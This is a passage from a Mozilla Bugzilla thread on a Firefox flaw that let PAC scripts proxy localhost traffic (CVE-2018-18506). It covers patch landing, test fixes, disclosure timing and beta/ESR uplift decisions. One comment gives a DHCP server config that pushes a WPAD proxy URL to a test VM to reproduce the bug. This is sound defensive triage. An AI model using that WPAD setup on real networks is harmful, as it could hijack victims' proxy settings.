|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1503393#c40)• 6 years ago |
|  | |

Attached patch

[v2-0002-bug-1503393-verify-default-localhost-not-proxied-.patch](attachment.cgi?id=9029279&action=diff)
— [Details](attachment.cgi?id=9029279&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9029279)

[Attachment #9023960](/attachment.cgi?id=9023960&action=edit "verify default localhost skipped from PAC proxying") -
Attachment is obsolete: true
[Attachment #9029279](/attachment.cgi?id=9029279&action=edit "v2-0002-bug-1503393-verify-default-localhost-not-proxied-.patch") -
Flags: review+

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1503393#c41)• 6 years ago |
|  | |

Attached patch

[v2-0003-Bug-1503393-Make-no-proxy-field-editable-r-jaws.patch](attachment.cgi?id=9029280&action=diff)
— [Details](attachment.cgi?id=9029280&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9029280)

[Attachment #9024992](/attachment.cgi?id=9024992&action=edit "Make 'no proxy' field editable") -
Attachment is obsolete: true
[Attachment #9029280](/attachment.cgi?id=9029280&action=edit "v2-0003-Bug-1503393-Make-no-proxy-field-editable-r-jaws.patch") -
Flags: review+

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1503393#c42)• 6 years ago |
|  | |

Attached patch

[v2-0004-bug-1503393-adjust-tests-for-localhost-proxying-r.patch](attachment.cgi?id=9029281&action=diff)
— [Details](attachment.cgi?id=9029281&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9029281)

[Attachment #9028261](/attachment.cgi?id=9028261&action=edit "0001-bug-1503393-adjust-tests-for-localhost-proxying-r-ma.patch") -
Attachment is obsolete: true
[Attachment #9029281](/attachment.cgi?id=9029281&action=edit "v2-0004-bug-1503393-adjust-tests-for-localhost-proxying-r.patch") -
Flags: review+

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=1503393#c43)• 6 years ago |
|  | |

I believe only the first actually needed a rebase but I bumped them all just to be safe.

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a2911599_16743)• 6 years ago |

Keywords: [checkin-needed](/buglist.cgi?keywords=checkin-needed&resolution=---)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=1503393#c44)• 6 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/49428012434e379316f2d831a088a27cf1b429ee>
<https://hg.mozilla.org/integration/autoland/rev/02e383b73c971e656097b3040e9cc523039018d6>
<https://hg.mozilla.org/integration/autoland/rev/7878029aaba609b5433d3eea98873a450cf2cb62>
<https://hg.mozilla.org/integration/autoland/rev/52e8ef71af9b837be53b294d09381d70c5efceba>Keywords: [checkin-needed](/buglist.cgi?keywords=checkin-needed&resolution=---)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=1503393#c45)• 6 years ago |
|  | |

Backed out for failing various browser-chrome tests, e.g. browser\_extension\_controlled.js:
<https://hg.mozilla.org/integration/autoland/rev/7670b6ce33a4b3ad15ff3dc1ec3bfb9349cec19b>
Push with failures: <https://treeherder.mozilla.org/#/jobs?repo=autoland&resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cusercancel%2Crunnable&group_state=expanded&revision=52e8ef71af9b837be53b294d09381d70c5efceba>Flags: needinfo?(daniel)

|  | [Alex Gaynor [:Alex\_Gaynor]](/user_profile?user_id=537703) |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=1503393#c46)• 6 years ago |
|  | |

P0 has disclosed the Chrome version of this issue: <https://bugs.chromium.org/p/project-zero/issues/detail?id=1707>

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a3694501_16743)• 6 years ago |

Assignee: daniel → nobody

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=1503393#c47)• 6 years ago |
|  | |

(In reply to Sebastian Hengst [:aryx] (needinfo on intermittent or backout) from [comment #45](/show_bug.cgi?id=1503393#c45 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))
> Backed out for failing various browser-chrome tests, e.g.
> browser\_extension\_controlled.js:
>
> <https://hg.mozilla.org/integration/autoland/rev/>
> 7670b6ce33a4b3ad15ff3dc1ec3bfb9349cec19b
>
> Push with failures:
> <https://treeherder.mozilla.org/#/>
> jobs?repo=autoland&resultStatus=testfailed%2Cbusted%2Cexception%2Cretry%2Cuse
> rcancel%2Crunnable&group\_state=expanded&revision=52e8ef71af9b837be53b294d0938
> 1d70c5efceba
Pretty sure this is just a pile of browser tests that need to have the pref flipped/changed so they don't break (or use a different URL). I can try to drive this over the line given :bagder has unassigned - unless someone else wants to take this.Assignee: nobody → gijskruitbosch+bugsStatus: NEW → ASSIGNED

|  | [Daniel Stenberg [:bagder]](/user_profile?user_id=16743) |  |
| --- | --- | --- |
| [Comment 48](/show_bug.cgi?id=1503393#c48)• 6 years ago |
|  | |

Please do. I unassigned myself from all my bugs as I've left Mozilla and don't want to give the perception that I will give these bugs much attention as I can't promise that.Flags: needinfo?(daniel)

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 49](/show_bug.cgi?id=1503393#c49)• 6 years ago |
|  | |

Relanded with a bunch more test fixes: <https://treeherder.mozilla.org/#/jobs?repo=mozilla-inbound&revision=69ca4c75a33194f5d9116b7777cd88c72ace69dc>

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 50](/show_bug.cgi?id=1503393#c50)• 6 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/ba6a8e3b0716>
<https://hg.mozilla.org/mozilla-central/rev/6830e17b39c6>
<https://hg.mozilla.org/mozilla-central/rev/681d8945da88>
<https://hg.mozilla.org/mozilla-central/rev/69ca4c75a331>Group: network-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 6 years ago
[status-firefox66](/buglist.cgi?f1=cf_status_firefox66&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox66&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → mozilla66

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 51](/show_bug.cgi?id=1503393#c51)• 6 years ago |
|  | |

Not sure what the backport story is on this bug, but I assume we'll want to let it bake on Nightly for a bit even if we do want to eventually uplift.
[status-firefox64](/buglist.cgi?f1=cf_status_firefox64&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox64&o1=equals&v1=wontfix)
[status-firefox65](/buglist.cgi?f1=cf_status_firefox65&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox65&o1=equals&v1=affected)
[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=affected)

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 52](/show_bug.cgi?id=1503393#c52)• 6 years ago |
|  | |

(In reply to Ryan VanderMeulen [:RyanVM] from [comment #51](/show_bug.cgi?id=1503393#c51 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))
> Not sure what the backport story is on this bug, but I assume we'll want to
> let it bake on Nightly for a bit even if we do want to eventually uplift.
Yeah. I actually think it isn't particularly risky, but also that we're unlikely to gain much from nightly testing in that I doubt many of them use PACs. The automated tests were a bit of a nightmare mainly \*because\* we use PACs for all our mochitest/marionette-based (and maybe others?) automated tests... Honza, you reviewed the platform bits, would you agree that uplifting to beta 65 should be done?
I think for ESR, pushing a change like this is potentially too disruptive for enterprises... it's sec-moderate, so we could decide not to uplift. On the other hand, they're also the most likely victims here. I'd suggest posting to the enterprise list but I don't think there's anything actionable they can do if we don't uplift the patch... We could potentially do a version of the patch that implements the new behavior behind a secondary pref, which they can then enable, but that seems like a lot of effort for very small returns... Thoughts, Ryan?
In other news, we should document that accessing localhost/127.0.0.1 directly in tests is now going to need you to push a pref change in the test, but I'm not sure where to do that documenting... I think the best bet to spread awareness is to post to mailing lists like m.d.platform and fx-dev, but I don't really want to paint a bulls-eye on this security issue. Thoughts, Dan? Arguably, Chrome has kinda 0-day'd us here by opening up their issue anyway...Flags: needinfo?(ryanvm)Flags: needinfo?(honzab.moz)Flags: needinfo?(dveditz)

|  | [Honza Bambas (:mayhemer)](/user_profile?user_id=269762) |  |
| --- | --- | --- |
| [Comment 53](/show_bug.cgi?id=1503393#c53)• 6 years ago |
|  | |

This is so specific case that I think uplifting is fine.
Corporate environments will likely get their PACs from trusted sources, so they are likely fine.
If someone plays with localhost while having a PAC setup, the one also likely knows what he/she is doing - is a power users or a developer and may already changed the prefs anyway. Those that don't know what they are doing (common users) will only benefit from this.
Honestly I'm kinda surprised this is kept so secretive. The change in default config like this should be more publicly communicated. Yeah, it's hard. It can also be used as an attack, potentially, in very special ceses.
So, yes, in favor of the beta uplift.Flags: needinfo?(honzab.moz)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 54](/show_bug.cgi?id=1503393#c54)• 6 years ago |
|  | |

(In reply to :Gijs (he/him) from [comment #52](/show_bug.cgi?id=1503393#c52 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))
> [...] but I don't really want to paint a bulls-eye on this security issue.
> Thoughts, Dan? Arguably, Chrome has kinda 0-day'd us here by opening up
> their issue anyway...
Technically it's Google P0 that published (the Chrome bug is still hidden), but that should be good enough to unhide ours.URL: [https://bugs.chromium.org/p/project-z...](https://bugs.chromium.org/p/project-zero/issues/detail?id=1707)
[tracking-firefox65](/buglist.cgi?f1=cf_tracking_firefox65&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox65&o1=equals&v1=%3F)Flags: needinfo?(dveditz)Whiteboard: [necko-triaged][keep hidden while crbug/899126 is] → [necko-triaged]

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 55](/show_bug.cgi?id=1503393#c55)• 6 years ago |
|  | |

Comment on [attachment 9029278](/attachment.cgi?id=9029278 "v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch") [[details]](/attachment.cgi?id=9029278&action=edit "v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch") [[diff]](/attachment.cgi?id=9029278&action=diff "v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9029278)
v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch
[Beta/Release Uplift Approval Request]
Feature/Bug causing the regression: n/a
User impact if declined: Security issues with localhost access when using pac
Is this code covered by automated tests?: Yes
Has the fix been verified in Nightly?: No
Needs manual test from QE?: Yes
If yes, steps to reproduce: See [comment 0](/show_bug.cgi?id=1503393#c0 "RESOLVED FIXED - firefox permits proxying localhost via PAC")
List of other uplifts needed: n/a
Risk to taking this patch: Low
Why is the change risky/not risky? (and alternatives if risky): See [comment 53](/show_bug.cgi?id=1503393#c53 "RESOLVED FIXED - firefox permits proxying localhost via PAC"); This is a straightforward set of changes that effectively change when an existing pref applies, and had to update a number of tests purely because of the idiosyncratic nature of the testing setup of mochitests (which uses PAC to control network access, but some tests then also try to use 127.0.0.1 and expect it to be served by the PAC'd test server).
String changes made/needed: None
[Attachment #9029278](/attachment.cgi?id=9029278&action=edit "v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch") -
Flags: approval-mozilla-beta?

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 56](/show_bug.cgi?id=1503393#c56)• 6 years ago |
|  | |

Comment on [attachment 9029279](/attachment.cgi?id=9029279 "v2-0002-bug-1503393-verify-default-localhost-not-proxied-.patch") [[details]](/attachment.cgi?id=9029279&action=edit "v2-0002-bug-1503393-verify-default-localhost-not-proxied-.patch") [[diff]](/attachment.cgi?id=9029279&action=diff "v2-0002-bug-1503393-verify-default-localhost-not-proxied-.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9029279)
v2-0002-bug-1503393-verify-default-localhost-not-proxied-.patch
See [comment 55](/show_bug.cgi?id=1503393#c55 "RESOLVED FIXED - firefox permits proxying localhost via PAC") for approval request
[Attachment #9029279](/attachment.cgi?id=9029279&action=edit "v2-0002-bug-1503393-verify-default-localhost-not-proxied-.patch") -
Flags: approval-mozilla-beta?

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 57](/show_bug.cgi?id=1503393#c57)• 6 years ago |
|  | |

Comment on [attachment 9029280](/attachment.cgi?id=9029280 "v2-0003-Bug-1503393-Make-no-proxy-field-editable-r-jaws.patch") [[details]](/attachment.cgi?id=9029280&action=edit "v2-0003-Bug-1503393-Make-no-proxy-field-editable-r-jaws.patch") [[diff]](/attachment.cgi?id=9029280&action=diff "v2-0003-Bug-1503393-Make-no-proxy-field-editable-r-jaws.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9029280)
v2-0003-Bug-1503393-Make-no-proxy-field-editable-r-jaws.patch
See [comment 55](/show_bug.cgi?id=1503393#c55 "RESOLVED FIXED - firefox permits proxying localhost via PAC") for approval request
[Attachment #9029280](/attachment.cgi?id=9029280&action=edit "v2-0003-Bug-1503393-Make-no-proxy-field-editable-r-jaws.patch") -
Flags: approval-mozilla-beta?

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 58](/show_bug.cgi?id=1503393#c58)• 6 years ago |
|  | |

Comment on [attachment 9029281](/attachment.cgi?id=9029281 "v2-0004-bug-1503393-adjust-tests-for-localhost-proxying-r.patch") [[details]](/attachment.cgi?id=9029281&action=edit "v2-0004-bug-1503393-adjust-tests-for-localhost-proxying-r.patch") [[diff]](/attachment.cgi?id=9029281&action=diff "v2-0004-bug-1503393-adjust-tests-for-localhost-proxying-r.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9029281)
v2-0004-bug-1503393-adjust-tests-for-localhost-proxying-r.patch
See [comment 55](/show_bug.cgi?id=1503393#c55 "RESOLVED FIXED - firefox permits proxying localhost via PAC") for approval request
Note: please uplift/graft/rebase the csets as landed on m-c, instead of trying to reapply these patches, which will only end in pain.
[Attachment #9029281](/attachment.cgi?id=9029281&action=edit "v2-0004-bug-1503393-adjust-tests-for-localhost-proxying-r.patch") -
Flags: approval-mozilla-beta?

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 59](/show_bug.cgi?id=1503393#c59)• 6 years ago |
|  | |

I'm inclined to let this wait for the next major ESR release rather than trying to backport, but that's not a strong feeling if others who better understand the risk vs. reward think it's a good idea to take on ESR60.
[tracking-firefox65](/buglist.cgi?f1=cf_tracking_firefox65&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox65&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox65&o1=equals&v1=%2B)
[tracking-firefox66](/buglist.cgi?f1=cf_tracking_firefox66&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox66&o1=equals&v1=%2B)Flags: needinfo?(ryanvm)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 60](/show_bug.cgi?id=1503393#c60)• 6 years ago |
|  | |

Comment on [attachment 9029278](/attachment.cgi?id=9029278 "v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch") [[details]](/attachment.cgi?id=9029278&action=edit "v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch") [[diff]](/attachment.cgi?id=9029278&action=diff "v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9029278)
v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch
[Triage Comment]
Fixes a sec issue already publicly disclosed by Project Zero. Approved for 65.0b6.
[Attachment #9029278](/attachment.cgi?id=9029278&action=edit "v2-0001-bug-1503393-never-let-localhost-get-sent-to-a-pro.patch") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a4318767_75935)• 6 years ago |

Flags: qe-verify+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a4318774_75935)• 6 years ago |

[Attachment #9029279](/attachment.cgi?id=9029279&action=edit "v2-0002-bug-1503393-verify-default-localhost-not-proxied-.patch") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a4318780_75935)• 6 years ago |

[Attachment #9029280](/attachment.cgi?id=9029280&action=edit "v2-0003-Bug-1503393-Make-no-proxy-field-editable-r-jaws.patch") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a4318785_75935)• 6 years ago |

[Attachment #9029281](/attachment.cgi?id=9029281&action=edit "v2-0004-bug-1503393-adjust-tests-for-localhost-proxying-r.patch") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 61](/show_bug.cgi?id=1503393#c61)• 6 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/08b14d60d0fc>
<https://hg.mozilla.org/releases/mozilla-beta/rev/005811564dc5>
<https://hg.mozilla.org/releases/mozilla-beta/rev/b380a84b065d>
<https://hg.mozilla.org/releases/mozilla-beta/rev/794b2e929584>
[status-firefox65](/buglist.cgi?f1=cf_status_firefox65&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox65&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox65&o1=equals&v1=fixed)
[tracking-firefox-esr60](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=equals&v1=%3F)

|  | [Catalin Sasca, Desktop Test Engineering [:csasca]](/user_profile?user_id=612754) |  |
| --- | --- | --- |
| [Comment 62](/show_bug.cgi?id=1503393#c62)• 6 years ago |
|  | |

Ok, so I've successfully set up the guest Windows 10 vm on Ubuntu 18.04 host, but I'm having trouble setting up the DHCP server. Can you provide some exact steps to set up the DHCP server?Flags: needinfo?(jannh)

|  | [Honza Bambas (:mayhemer)](/user_profile?user_id=269762) |  |
| --- | --- | --- |
| [Comment 63](/show_bug.cgi?id=1503393#c63)• 6 years ago |
|  | |

(In reply to Sasca Catalin, QA [:csasca] from [comment #62](/show_bug.cgi?id=1503393#c62 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))
> Ok, so I've successfully set up the guest Windows 10 vm on Ubuntu 18.04
> host, but I'm having trouble setting up the DHCP server. Can you provide
> some exact steps to set up the DHCP server?
The last time I was playing with this was to use Windows Server 2016 trial and allow DHCP there, in an isolated Virtual Box NAT'ed network. The steps are here:
[https://bugzilla.mozilla.org/show\_bug.cgi?id=356831#c114](/show_bug.cgi?id=356831#c114 "RESOLVED FIXED - Proxy autodiscovery doesn't check DHCP (option 252)")

|  | [Catalin Sasca, Desktop Test Engineering [:csasca]](/user_profile?user_id=612754) |  |
| --- | --- | --- |
| [Comment 64](/show_bug.cgi?id=1503393#c64)• 6 years ago |
|  | |

I am still not able to setup and config the DHCP server on the host side. Honza, can you please provide some STR on how to do it?Flags: needinfo?(jannh) → needinfo?(honzab.moz)

|  | [Cornel Ionce [:noni] [Hubs QA]](/user_profile?user_id=458186) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a5665922_458186)• 6 years ago |

Whiteboard: [necko-triaged] → [necko-triaged][post-critsmash-triage]

|  | [Jann Horn](/user_profile?user_id=597249)  Reporter |  |
| --- | --- | --- |
| [Comment 65](/show_bug.cgi?id=1503393#c65)• 6 years ago |
|  | |

I created a new bridge interface by first placing the following in /etc/network/interfaces:
```
iface br0 inet static
address 192.168.250.1/24
```
and then running `ifup br0` (or something like that).
I created a VM with virt-manager, and set its networking as "Networking source: Specify shared device name" with device name "br0".
I installed the ISC dhcp server and added something like the following in /etc/dhcp/dhcpd.conf :
```
option domain-name-servers 8.8.8.8;
option wpad-url code 252 = text;
subnet 192.168.250.0 netmask 255.255.255.0 {
range 192.168.250.2 192.168.250.200;
option routers 192.168.250.1;
option wpad-url "<http://192.168.250.1:8080/proxy.pac>";
option wpad-url "file://c:/foobar/blah";
}
```
I stopped the systemd service isc-dhcp-server.service, changed /etc/default/isc-dhcp-server to make the DHCP server listen on the bridge interface in (`INTERFACESv4="br0"`), and then started the service again.

|  | [Honza Bambas (:mayhemer)](/user_profile?user_id=269762) |  |
| --- | --- | --- |
| [Comment 66](/show_bug.cgi?id=1503393#c66)• 6 years ago |
|  | |

(In reply to Sasca Catalin, QA [:csasca] from [comment #64](/show_bug.cgi?id=1503393#c64 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))
> I am still not able to setup and config the DHCP server on the host side.
> Honza, can you please provide some STR on how to do it?
[Comment 63](/show_bug.cgi?id=1503393#c63 "RESOLVED FIXED - firefox permits proxying localhost via PAC")? I don't know about any other way, sorry.Flags: needinfo?(honzab.moz)

|  | [Catalin Sasca, Desktop Test Engineering [:csasca]](/user_profile?user_id=612754) |  |
| --- | --- | --- |
| [Comment 67](/show_bug.cgi?id=1503393#c67)• 6 years ago |
|  | |

Unfortunately, we're unable to simulate these environment conditions on our network, and therefore cannot verify the bug. If there's anyone else that would like to give this a try, it would be appreciated.Flags: qe-verify+

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a6858555_280903)• 6 years ago |

Whiteboard: [necko-triaged][post-critsmash-triage] → [necko-triaged][post-critsmash-triage][adv-main65+]

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a7249642_280903)• 6 years ago |

Alias: CVE-2018-18506

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a8530190_75935)• 6 years ago |

Depends on: [1524264](/show_bug.cgi?id=1524264 "VERIFIED FIXED - Move \"No Proxy for\" outside the radio button and change the case for design guidelines")

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 68](/show_bug.cgi?id=1503393#c68)• 6 years ago |
|  | |

Junior, can you please rebase the 4th patch for ESR60 and request approval for these patches? Talking to the sec folks, it sounds like managed ESR environments are the ones most in need of these changes. Thanks!

[tracking-firefox-esr60](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=equals&v1=%3F) → [66+](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=equals&v1=66%2B)Flags: needinfo?(juhsu)

|  | [Junior [inactive]](/user_profile?user_id=611900) |  |
| --- | --- | --- |
| [Comment 69](/show_bug.cgi?id=1503393#c69)• 6 years ago |
|  | |

Attached patch

[patch3\_for\_esr60](attachment.cgi?id=9046859&action=diff)
— [Details](attachment.cgi?id=9046859&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9046859)

|  | [Junior [inactive]](/user_profile?user_id=611900) |  |
| --- | --- | --- |
| [Comment 70](/show_bug.cgi?id=1503393#c70)• 6 years ago |
|  | |

Attached patch

[patch4\_for\_esr60](attachment.cgi?id=9046861&action=diff)
— [Details](attachment.cgi?id=9046861&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9046861)

|  | [Junior [inactive]](/user_profile?user_id=611900) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1503393#a10286437_611900)• 6 years ago |

[Attachment #9046861](/attachment.cgi?id=9046861&action=edit "patch4_for_esr60") -
Attachment is patch: true
[Attachment #9046861](/attachment.cgi?id=9046861&action=edit "patch4_for_esr60") -
Attachment mime type: application/octet-stream → text/plainFlags: needinfo?(juhsu)

|  | [Junior [inactive]](/user_profile?user_id=611900) |  |
| --- | --- | --- |
| [Comment 71](/show_bug.cgi?id=1503393#c71)• 6 years ago |
|  | |

Comment on [attachment 9046861](/attachment.cgi?id=9046861 "patch4_for_esr60") [[details]](/attachment.cgi?id=9046861&action=edit "patch4_for_esr60") [[diff]](/attachment.cgi?id=9046861&action=diff "patch4_for_esr60") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9046861)

patch4\_for\_esr60

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**: See [comment 68](/show_bug.cgi?id=1503393#c68 "RESOLVED FIXED - firefox permits proxying localhost via PAC")
* **User impact if declined**: Security issues with localhost access when using pac
* **Fix Landed on Version**: 66
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: See [comment 53](/show_bug.cgi?id=1503393#c53 "RESOLVED FIXED - firefox permits proxying localhost via PAC"); This is a straightforward set of changes that effectively change when an existing pref applies, and had to update a number of tests purely because of the idiosyncratic nature of the testing setup of mochitests (which uses PAC to control network access, but some tests then also try to use 127.0.0.1 and expect it to be served by the PAC'd test server).
* **String or UUID changes made by this patch**: no
[Attachment #9046861](/attachment.cgi?id=9046861&action=edit "patch4_for_esr60") -
Flags: approval-mozilla-esr60?

|  | [Junior [inactive]](/user_profile?user_id=611900) |  |
| --- | --- | --- |
| [Comment 72](/show_bug.cgi?id=1503393#c72)• 6 years ago |
|  | |

(In reply to Ryan VanderMeulen [:RyanVM] from [comment #68](/show_bug.cgi?id=1503393#c68 "RESOLVED FIXED - firefox permits proxying localhost via PAC"))

> Junior, can you please rebase the 4th patch for ESR60 and request approval for these patches? Talking to the sec folks, it sounds like managed ESR environments are the ones most in need of these changes. Thanks!

I did some manual rebase for patch 3 and patch 4, so I upload both.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 73](/show_bug.cgi?id=1503393#c73)• 6 years ago |
|  | |

Comment on [attachment 9046861](/attachment.cgi?id=9046861 "patch4_for_esr60") [[details]](/attachment.cgi?id=9046861&action=edit "patch4_for_esr60") [[diff]](/attachment.cgi?id=9046861&action=diff "patch4_for_esr60") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1503393&attachment=9046861)
patch4\_for\_esr60
Per discussion with Dan, this is a bug we should take on ESR since it's a publicly-disclosed issue more likely to affect enterprises. This fix shipped in Fx65 without any major fallout, so I agree with the risk assessment. Approved for 60.6esr.
[Attachment #9046861](/attachment.cgi?id=9046861&action=edit "patch4_for_esr60") -
Flags: approval-mozilla-esr60? → approval-mozilla-esr60+

|  | [:Gijs (he/him)](/user_profile?user_id=159069)  Assignee |  |
| --- | --- | --- |
| [Comment 74](/show_bug.cgi?id=1503393#c74)• 6 years ago |
|  | |

Junior, should we also take the patch from [bug 1524264](/show_bug.cgi?id=1524264 "VERIFIED FIXED - Move \"No Proxy for\" outside the radio button and change the case for design guidelines") on esr considering the confusion among enterprise users?

Flags: needinfo?(juhsu)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 75](/show_bug.cgi?id=1503393#c75)• 6 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr60/rev/2b5ce588bfca>

<https://hg.mozilla.org/releases/mozilla-esr60/rev/4318df2ee221>

<https://hg.mozilla.org/releases/mozilla-esr60/rev/bfb67f6a37d4>

<https://hg.mozilla.org/releases/mozilla-esr60/rev/02afe5b3919e>

[status-firefox-esr60](/buglist.cgi?f1=cf_status_firefox_esr60&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=fixed)

|  | [Junior [inactive]](/user_profile?user_id=611900) |  |
| --- | --- | --- |
| [Comment 76](/show_bug.cgi?id=1503393#c76)• 6 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1503393&comment_id=13955976 "1 revision") |
|  | |

